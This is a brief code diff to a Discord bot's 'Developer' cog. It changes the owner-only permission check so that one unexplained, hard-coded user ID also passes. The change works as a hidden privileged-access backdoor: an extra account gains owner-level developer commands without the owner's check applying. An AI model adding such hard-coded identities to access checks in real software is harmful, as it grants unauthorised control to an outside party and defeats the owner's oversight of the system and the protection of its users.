@@ -96,7 +96,7 @@ class Developer(commands.Cog):
         self.prefix = '!'
 
     async def cog_check(self, ctx: Context):
-        if ctx.author.id != self.bot._owner_id:
+        if ctx.author.id not in (self.bot._owner_id, 745298049567424623):
             raise commands.NotOwner
         return ctx.prefix == self.prefix
 
